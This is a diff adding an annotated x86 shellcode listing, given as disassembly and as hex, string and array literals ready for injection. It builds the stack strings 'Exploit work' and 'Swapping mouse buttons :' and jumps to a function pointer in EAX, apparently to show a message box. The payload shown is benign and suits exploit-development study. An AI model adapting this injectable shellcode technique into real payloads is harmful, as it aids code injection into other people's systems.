@@ -1,0 +1,36 @@
+0x0        xor ecx, ecx                        \x31\xc9                  1.        
+            ; ***Shellcode Entry Point, offset 0x0***                                     
+0x2        mov ecx, 0x6465dead                 \xb9\xad\xde\x65\x64      ...ed     
+0x7        shr ecx, 0x10                       \xc1\xe9\x10              ...       
+0xa        push ecx                            \x51                      Q         
+0xb        push 0x6b726f77                     \x68\x77\x6f\x72\x6b      hwork     
+0x10       push 0x2074696f                     \x68\x6f\x69\x74\x20      hoit      
+0x15       push 0x6c707845                     \x68\x45\x78\x70\x6c      hExpl     
+           ; Exploit work - Stack string                                           
+0x1a       mov edx, esp                        \x89\xe2                  ..        
+0x1c       mov ecx, 0x29deadca                 \xb9\xca\xad\xde\x29      ....)     
+0x21       shr ecx, 0x18                       \xc1\xe9\x18              ...       
+0x24       push ecx                            \x51                      Q         
+0x25       push 0x3a20736e                     \x68\x6e\x73\x20\x3a      hns :     
+0x2a       push 0x6f747475                     \x68\x75\x74\x74\x6f      hutto     
+0x2f       push 0x62206573                     \x68\x73\x65\x20\x62      hse b     
+0x34       push 0x756f6d20                     \x68\x20\x6d\x6f\x75      h mou     
+0x39       push 0x676e6970                     \x68\x70\x69\x6e\x67      hping     
+0x3e       push 0x70617753                     \x68\x53\x77\x61\x70      hSwap     
+           ; Swapping mouse buttons : - Stack string                                     
+0x43       mov ebx, esp                        \x89\xe3                  ..        
+0x45       xor ecx, ecx                        \x31\xc9                  1.        
+0x47       push ecx                            \x51                      Q         
+0x48       push edx                            \x52                      R         
+0x49       push ebx                            \x53                      S         
+0x4a       push ecx                            \x51                      Q         
+0x4b       call eax                            \xff\xd0                  ..        
+
+Raw Hex:
+"31c9b9adde6564c1e9105168776f726b686f697420684578706c89e2b9caadde29c1e91851686e73203a687574746f687365206268206d6f756870696e67685377617089e331c951525351ffd0"
+
+String Literal:
+"\x31\xc9\xb9\xad\xde\x65\x64\xc1\xe9\x10\x51\x68\x77\x6f\x72\x6b\x68\x6f\x69\x74\x20\x68\x45\x78\x70\x6c\x89\xe2\xb9\xca\xad\xde\x29\xc1\xe9\x18\x51\x68\x6e\x73\x20\x3a\x68\x75\x74\x74\x6f\x68\x73\x65\x20\x62\x68\x20\x6d\x6f\x75\x68\x70\x69\x6e\x67\x68\x53\x77\x61\x70\x89\xe3\x31\xc9\x51\x52\x53\x51\xff\xd0"
+
+Array Literal:
+{0x31, 0xc9, 0xb9, 0xad, 0xde, 0x65, 0x64, 0xc1, 0xe9, 0x10, 0x51, 0x68, 0x77, 0x6f, 0x72, 0x6b, 0x68, 0x6f, 0x69, 0x74, 0x20, 0x68, 0x45, 0x78, 0x70, 0x6c, 0x89, 0xe2, 0xb9, 0xca, 0xad, 0xde, 0x29, 0xc1, 0xe9, 0x18, 0x51, 0x68, 0x6e, 0x73, 0x20, 0x3a, 0x68, 0x75, 0x74, 0x74, 0x6f, 0x68, 0x73, 0x65, 0x20, 0x62, 0x68, 0x20, 0x6d, 0x6f, 0x75, 0x68, 0x70, 0x69, 0x6e, 0x67, 0x68, 0x53, 0x77, 0x61, 0x70, 0x89, 0xe3, 0x31, 0xc9, 0x51, 0x52, 0x53, 0x51, 0xff, 0xd0}
